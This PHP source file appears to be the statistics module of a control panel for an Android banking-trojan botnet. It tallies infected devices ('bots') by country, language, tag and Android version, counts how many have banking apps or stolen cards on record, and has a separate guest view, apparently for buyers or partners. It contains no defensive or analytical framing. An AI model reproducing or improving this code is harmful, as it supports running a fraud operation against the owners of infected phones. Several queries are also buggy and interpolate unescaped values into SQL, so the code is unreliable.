<?php
require_once "cmd_mod.php";

class statistics extends modBase
{
	protected $module_name = 'statistics';
	private $sql_cut = '';
	private $guest_mode = false;
	
	function get_content($guest_mode=false)
	{
		$this->guest_mode = $guest_mode;
		
		// all javascripts removed in Guest mode
		$title = '';
		$content = '';
		
		if($this->guest_mode)
		{
			$buttons = array();
			
			$data = $this->db->exec("select value from config where name='guest_stats_cleared'", null, true);
			if(isset($data[0]['value']) && $data[0]['value'] != '')
			{
				$d = date("Y-m-d H:i:s", $data[0]['value']); // 2016-11-18
				$this->sql_cut = "where registered > '{$d}'";
				
				$d2 = date("d.m.Y G:i", $data[0]['value']);
				//~ $content .= "<h3>Statistics from {$d2}</h3>";
				$title = "Bots registered after <span style='color: yellow'>{$d2}</span>";
			}else{
				$title = "Statistics of all bots";
			}

		}else{

			$folder = explode("bot_", $this->client_cfg['db_name'], 2)[1];
			$guest_url = "/{$folder}/{$this->client_cfg['guest_url']}";

			$buttons = array(
				array('Guest statistics', 'Show statistics for guests', "location.href=\"$guest_url\"", 'info'),
			);
			
			$data = $this->db->exec("select value from config where name='guest_stats_cleared'", null, true);
			
			if(isset($data[0]['value']) && $data[0]['value'] != '')
				$buttons[] = array('Restore', 'Restore guest statistics', 'ajax_command("panel_stats", {action: "restore"}, true)', 'primary');
			else
				$buttons[] = array('Clear', 'Clear guest statistics. You can restore it later', 'ajax_command("panel_stats", {action: "clear"}, true)', 'danger');
			
		}
		
		$data = $this->db->exec("select count(id) from bots {$this->sql_cut}", null, true);
		if($data[0]['count(id)'] == 0)
			$content .= "<center><h3>No bots yet</h3></center>";
		else {
			$content .= "<h3>By country</h3>" . $this->get_country_cell();
			$content .= "<h3>By language</h3>" . $this->get_language_cell();
			$content .= "<h3>By tag</h3>" . $this->get_tag_cell();
			$content .= "<h3>By Android version</h3>" . $this->get_android_cell();
		}
		
		return $this->wrap_content($title, $content, 0, $buttons);
	}
	
	function get_country_cell()
	{
		$headers = array('Country', 'Total', 'Online', 'Offline');
		if(!$this->guest_mode)
		{
			$headers[] = 'Have banks';
			$headers[] = 'Have cards';
		}
		
		$sql = <<<SQL
			select
			`country`,
			count(`bot_id`) as `total`,
			sum(`is_online`(`timestamp`)) as `online`,
			count(`bot_id`) - sum(`is_online`(`timestamp`)) as `offline`
			from `bots` {$this->sql_cut}
			group by `country`
			order by `online` desc, `country`
SQL;
		
		$countries = $this->db->exec($sql, null, true);
		
		if(!$this->guest_mode)
			$total = array('Total', 0, 0, 0, 0, 0);
		else
			$total = array('Total', 0, 0, 0);
			
		$rows = array();
		foreach($countries as $data)
		{
			$country_code = $data['country'];
			$flag = hlp::get_flag($data['country'], '', false);
			$fname = hlp::get_country_name($data['country']);
			
			$data['country'] = "<div style='text-align: left'>{$flag}&nbsp;&nbsp;{$fname}</div>";
			
			// Count banks for country
			$data['has_banks'] = 0; 
			
			$sql_banks = <<<PHP
SELECT count(bots.id) FROM `bots` INNER JOIN 
bot_banks ON bots.bot_id=bot_banks.bot_id
WHERE country="{$country_code}"
PHP;

			$check = $this->db->exec($sql_banks, null, true);
			if(sizeof($check))
				$data['has_banks'] += $check[0][0];
			
			// Count cards for country
			$data['has_cards'] = 0; 
			
			$sql_cards = <<<PHP
SELECT count(bots.id) FROM `bots` INNER JOIN 
bot_cards ON bots.bot_id=bot_cards.bot_id
WHERE country="{$country_code}"
PHP;

			$check = $this->db->exec($sql_cards, null, true);
			if(sizeof($check))
				$data['has_cards'] += $check[0][0];

			if($this->guest_mode)
				$rows[] = array($data['country'], $data['total'], $data['online'], $data['offline']);
			else
				$rows[] = array($data['country'], $data['total'], $data['online'], $data['offline'], $data['has_banks'], $data['has_cards']);
			
			// last total row
			$total[1] += intval($data['total']);
			$total[2] += intval($data['online']);
			$total[3] += intval($data['offline']);
			
			if(!$this->guest_mode)
			{
				$total[4] += intval($data['has_banks']);
				$total[5] += intval($data['has_cards']);
			}
		}
		
		$rows[] = $total;
		
		return $this->get_table($rows, $headers, "textcenter");
	}
	
	function get_language_cell()
	{
		$headers = array('Language', 'Total', 'Online', 'Offline');
		if(!$this->guest_mode)
		{
			$headers[] = 'Have banks';
			$headers[] = 'Have cards';
		}
		
		$sql = <<<SQL
			select
			`lang`,
			count(`bot_id`) as `total`,
			sum(`is_online`(`timestamp`)) as `online`,
			count(`bot_id`) - sum(`is_online`(`timestamp`)) as `offline`
			from `bots` {$this->sql_cut}
			group by `lang`
			order by `online` desc, `lang`
SQL;

		$countries = $this->db->exec($sql, null, true);
		
		if(!$this->guest_mode)
			$total = array('Total', 0, 0, 0, 0, 0);
		else
			$total = array('Total', 0, 0, 0);
			
		$rows = array();
		foreach($countries as $data)
		{
			$lang_code = $data['lang'];
			$flag = hlp::get_flag($data['lang'], '', true);
			$fname = hlp::get_language_name($data['lang']);
			
			$data['lang'] = "<div style='text-align: left'>{$flag}&nbsp;&nbsp;{$fname}</div>";
			
			// Count banks for lang
			$data['has_banks'] = 0; 
			
			$sql_banks = <<<PHP
SELECT count(bots.id) FROM `bots` INNER JOIN 
bot_banks ON bots.bot_id=bot_banks.bot_id
WHERE lang="{$lang_code}"
PHP;

			$check = $this->db->exec($sql_banks, null, true);
			if(sizeof($check))
				$data['has_banks'] += $check[0][0];
			
			// Count cards for country
			$data['has_cards'] = 0; 
			
			$sql_cards = <<<PHP
SELECT count(bots.id) FROM `bots` INNER JOIN 
bot_cards ON bots.bot_id=bot_cards.bot_id
WHERE lang="{$lang_code}"
PHP;

			$check = $this->db->exec($sql_cards, null, true);
			if(sizeof($check))
				$data['has_cards'] += $check[0][0];
			
			if($this->guest_mode)
				$rows[] = array($data['lang'], $data['total'], $data['online'], $data['offline']);
			else
				$rows[] = array($data['lang'], $data['total'], $data['online'], $data['offline'], $data['has_banks'], $data['has_cards']);
			
			if(!$this->guest_mode)
			{
				$rows[] = $data['has_banks'];
				$rows[] = $data['has_cards'];
			}
			
			// last total row
			$total[1] += intval($data['total']);
			$total[2] += intval($data['online']);
			$total[3] += intval($data['offline']);
			
			if(!$this->guest_mode)
			{
				$total[4] += intval($data['has_banks']);
				$total[5] += intval($data['has_cards']);
			}
		}
		
		$rows[] = $total;
		
		return $this->get_table($rows, $headers, "textcenter");
	}
	
	function get_tag_cell()
	{
		$headers = array('Tag', 'Total', 'Online', 'Offline');
		if(!$this->guest_mode)
		{
			$headers[] = 'Have banks';
			$headers[] = 'Have cards';
		}
		
		$sql = <<<SQL
			select
			`tag`,
			count(`bot_id`) as `total`,
			sum(`is_online`(`timestamp`)) as `online`,
			count(`bot_id`) - sum(`is_online`(`timestamp`)) as `offline`
			from `bots` {$this->sql_cut}
			group by `tag`
			order by `online` desc, `tag`
SQL;
		
		$countries = $this->db->exec($sql, null, true);
		
		if(!$this->guest_mode)
			$total = array('Total', 0, 0, 0, 0, 0);
		else
			$total = array('Total', 0, 0, 0);
			
		$rows = array();
		foreach($countries as $data)
		{
			$tag = $data['tag'];
			$data['tag'] = "<a href='#page:menu-bots;bots-filter-tag={$data['tag']}'>{$data['tag']}</a>";
			// Count banks for lang
			$data['has_banks'] = 0; 
			
			$sql_banks = <<<PHP
SELECT count(bots.id) FROM `bots` INNER JOIN 
bot_banks ON bots.bot_id=bot_banks.bot_id
WHERE tag="{$data['tag']}"
PHP;

			$check = $this->db->exec($sql_banks, null, true);
			if(sizeof($check))
				$data['has_banks'] += $check[0][0];
			
			// Count cards for country
			$data['has_cards'] = 0; 
			
			$sql_cards = <<<PHP
SELECT count(bots.id) FROM `bots` INNER JOIN 
bot_cards ON bots.bot_id=bot_cards.bot_id
WHERE tag="{$data['tag']}"
PHP;

			$check = $this->db->exec($sql_cards, null, true);
			if(sizeof($check))
				$data['has_cards'] += $check[0][0];
			
			if($this->guest_mode)
				$rows[] = array($data['tag'], $data['total'], $data['online'], $data['offline']);
			else
				$rows[] = array($data['tag'], $data['total'], $data['online'], $data['offline'], $data['has_banks'], $data['has_cards']);
			
			if(!$this->guest_mode)
			{
				$rows[] = $data['has_banks'];
				$rows[] = $data['has_cards'];
			}
			
			// last total row
			$total[1] += intval($data['total']);
			$total[2] += intval($data['online']);
			$total[3] += intval($data['offline']);
			
			if(!$this->guest_mode)
			{
				$total[4] += intval($data['has_banks']);
				$total[5] += intval($data['has_cards']);
			}
		}
		
		$rows[] = $total;
		
		return $this->get_table($rows, $headers, "textcenter");
	}
	
	function get_android_cell()
	{
		$headers = array('Android version', 'Total', 'Online', 'Offline');
		if(!$this->guest_mode)
		{
			$headers[] = 'Have banks';
			$headers[] = 'Have cards';
		}
		
		$sql = <<<SQL
			select
			`android`,
			count(`bot_id`) as `total`,
			sum(`is_online`(`timestamp`)) as `online`,
			count(`bot_id`) - sum(`is_online`(`timestamp`)) as `offline`
			from `bots` {$this->sql_cut}
			group by `android`
			order by `online` desc, `android`
SQL;
		
		$countries = $this->db->exec($sql, null, true);
		
		if(!$this->guest_mode)
			$total = array('Total', 0, 0, 0, 0, 0);
		else
			$total = array('Total', 0, 0, 0);
			
		$rows = array();
		foreach($countries as $data)
		{
			$ver = $data['android'];
			$data['android'] = "<div style='text-align: left'>" . $data['android'] ." ". hlp::get_android_name($data['android']) . "</div>";
			
			// Count banks for android
			$data['has_banks'] = 0; 
			
			$sql_banks = <<<PHP
SELECT count(bots.id) FROM `bots` INNER JOIN 
bot_banks ON bots.bot_id=bot_banks.bot_id
WHERE android="{$data['android']}"
PHP;

			$check = $this->db->exec($sql_banks, null, true);
			if(sizeof($check))
				$data['has_banks'] += $check[0][0];
			
			// Count cards for android
			$data['has_cards'] = 0; 
			
			$sql_cards = <<<PHP
SELECT count(bots.id) FROM `bots` INNER JOIN 
bot_cards ON bots.bot_id=bot_cards.bot_id
WHERE android="{$ver}"
PHP;

			$check = $this->db->exec($sql_cards, null, true);
			if(sizeof($check))
				$data['has_cards'] += $check[0][0];
			
			if($this->guest_mode)
				$rows[] = array($data['android'], $data['total'], $data['online'], $data['offline']);
			else
				$rows[] = array($data['android'], $data['total'], $data['online'], $data['offline'], $data['has_banks'], $data['has_cards']);
				
			if(!$this->guest_mode)
			{
				$rows[] = $data['has_banks'];
				$rows[] = $data['has_cards'];
			}
			
			// last total row
			$total[1] += intval($data['total']);
			$total[2] += intval($data['online']);
			$total[3] += intval($data['offline']);
			
			if(!$this->guest_mode)
			{
				$total[4] += intval($data['has_banks']);
				$total[5] += intval($data['has_cards']);
			}
		}
		
		$rows[] = $total;
		
		return $this->get_table($rows, $headers, "textcenter");
	}
}
